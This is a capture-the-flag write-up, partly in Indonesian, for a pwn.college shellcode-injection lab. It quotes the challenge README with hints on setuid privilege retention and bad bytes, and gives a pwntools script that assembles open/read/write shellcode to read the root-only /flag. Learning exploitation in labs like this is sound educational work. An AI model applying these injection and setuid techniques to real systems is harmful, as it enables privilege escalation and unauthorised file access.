# Test Shellcode

> **Description**: A playground for your first machine-code programs. The challenge copies whatever bytes you send it into executable memory and runs them — make it read /flag.

| Property | Detail |
| :--- | :--- |
| **Category** | Pwn / Binary Exploitation |
| **Vuln** | Shellcode Injection |
| **Challenge URL** | [https://pwn.college/intro-re-pwn~5933fc84/shellcode/](https://pwn.college/intro-re-pwn~5933fc84/shellcode/) |
| **Status** | Solved |
| **Date Completed** | 2026-11-05 |

## Analysis

**File & Checksec**

```bash
shellcode-tester: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6ec4850ac0c5dbe55c11309d379291c7353f227c, for GNU/Linux 3.2.0, not stripped

Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
``` 

Pertama, saya membaca README.md yang ada didalam tantangan ini.

```markdown
# Test Shellcode

## Background

Read the module's **"Start here"** resources first. For this challenge you need:

- **System calls** ("System calls, registers, and machine code"): how code asks Linux to open, read and write files. Number in `rax`, arguments in `rdi`, `rsi`, `rdx`, then `syscall`.
- **pwntools `asm` and `shellcraft`** ("Worked example"): turning assembly into bytes, and printing a template before you trust it.
- **Bad bytes** ("Bad bytes: newline and NUL"): some variants refuse input containing the newline byte `0x0a`.
- **Setuid** ("Setuid programs"): only if you choose to start a shell. Code that reads the file directly does not need it.

One thing that surprises people: `checksec` reports **NX enabled** for this program, yet your bytes still run. NX protects the stack and other data; this program *asks* the kernel for a separate executable page with `mmap`, and runs your bytes there.

### How to start

```bash
objdump -d -M intel /challenge/shellcode-tester | more     # find main: mmap, read, then "call" through a register (type /main to search, q to quit)
python3 -c 'from pwn import *; context.arch="amd64"; open("/tmp/hi.bin","wb").write(asm(shellcraft.echo("hi\n")+shellcraft.exit(0)))'
/challenge/shellcode-tester < /tmp/hi.bin                   # prints "hi": your bytes ran
```

The last two lines are a test that the path from your file to the CPU works. They print `hi`; they do not read the flag. Replace the shellcode with your own once you see `hi`.

## The challenge

**Shellcode** is machine code — raw CPU instructions, not source code — usually written to do something the program's author never intended, such as starting a shell. The name comes from the classic payload that runs a shell.

This challenge gives you a *tester*: a program that

1. asks the operating system for a page of memory that is readable, writable **and executable** (an **RWX page**),
2. copies the bytes you send it on standard input into that page, and
3. jumps to the first byte of the page and executes them as code.

Everything runs as **root** (the binary is setuid), and `/flag` is a file only root can read. Your goal: write code that makes the challenge print the contents of `/flag`.

You don't need to invent anything from scratch. Python's **pwntools** library (installed in the workspace) can assemble x86-64 instructions for you — look at `pwnlib.shellcraft` and `pwnlib.asm.asm()`.

## Running it

```bash
/challenge/shellcode-tester
```

Type bytes and press Enter... and nothing useful happens, because your keystrokes are being *executed*, not read. You want to feed it a file of raw bytes instead:

```bash
cat my-shellcode.bin | /challenge/shellcode-tester
```

Write the bytes with pwntools and save them:

```python
from pwn import *
context.arch = "amd64"
open("my-shellcode.bin", "wb").write(asm(shellcraft.sh()))
```

(That shell starts as *you*, not root, so it cannot read `/flag` yet. Hint 3 and the "Setuid programs" resource explain why and what to add.)

## Hints

<details>
<summary>Hint 1</summary>

Look at what the program does before you write any code. `objdump -d /challenge/shellcode-tester` (or `disass main` in gdb) shows the three steps above: a call to `mmap` requesting read+write+execute, a call to `read` from standard input, and then a call *through a register* — an indirect call to whatever `read` filled in.
</details>

<details>
<summary>Hint 2</summary>

Your code runs with root *effective* privileges already, so it may simply open `/flag`, read it, and write it out. The relevant Linux **syscalls** are `open` (2), `read` (0) and `write` (1). Each is invoked by putting the number in `rax`, the arguments in `rdi`, `rsi`, `rdx`, and executing `syscall`.
</details>

<details>
<summary>Hint 3</summary>

Prefer a shell? `shellcraft.sh()` builds an `execve("/bin/sh")` payload for you. One catch: the tester's *real* user id is still yours even though its *effective* id is root, and a new shell starts with the real id. Call `setreuid(geteuid(), -1)` first (syscalls `geteuid` = 107, `setreuid` = 113) so the shell keeps root.
</details>

<details>
<summary>Hint 4</summary>

Later variants refuse input containing the byte `0x0a` (newline). Check your assembled payload with `b"\x0a" in sc` — and if it's there, rework the instruction that produced it, most often a `push` or `mov` whose immediate value contains the byte. Reordering how you build the same value on the stack is enough.
</details>

<details>
<summary>Hint 5 (stuck?)</summary>

`gdb /challenge/shellcode-tester`, run it with some input, and use `vmmap` after the `mmap` — you'll see the RWX page your bytes landed in. You can even `break` right before the indirect call and inspect the page.
</details>
```

Berdasarkan README.md, saya menyimpulkan bahwa perlu membuat syscall untuk mengeluarkan flag, syscall tersebut adalah open, read dan write. Lalu apa itu syscall? syscall / system call adalah cara program yang berada dalam hak akses user dapat memperoleh akses dan sumber daya kepada sistem kernel (kernel mode), simpelnya syscall adalah jembatan antara User privilage dan kernel privilage

## Exploitation
Saya susun payload eksploitasi berikut:

```python
from pwn import *

# ==========================================
# CONFIGURATION
# ==========================================

BINARY = "./shellcode-tester"

context.binary = ELF(BINARY, checksec=False)
context.arch = context.binary.arch
context.log_level = "debug"

elf = context.binary

# ==========================================
# CONNECTION
# ==========================================

io = process(BINARY)

# ==========================================
# EXPLOIT 
# ==========================================

def exploit(io):
    
    sc = shellcraft.open('/flag')
    sc += shellcraft.read(3 , 'rsp'  , 0x100)
    sc += shellcraft.write(1, 'rsp' , 0x100)
        
    payload = asm(sc)
    
    sleep(0.5) 
    io.send(payload)
    
    res = io.recvuntil(b'pwn.college')
    
    print(res.decode())


# ==========================================
# MAIN
# ==========================================

def main():

    exploit(io)

    io.interactive()


if __name__ == "__main__":
    main()

```

**Flag**: pwn.college{redacted}

## New Knowledge
- Memahami cara kerja shellcode injection dan bagaimana shellcode dieksekusi oleh sistem
- Mempelajari cara kerja syscall: Open, read, write

## References
- [https://pwn.college/intro-re-pwn~5933fc84/shellcode/](https://pwn.college/intro-re-pwn~5933fc84/shellcode/)
- [https://en-wikipedia-org.translate.goog/wiki/File_descriptor?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=sge](https://en-wikipedia-org.translate.goog/wiki/File_descriptor?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=sge)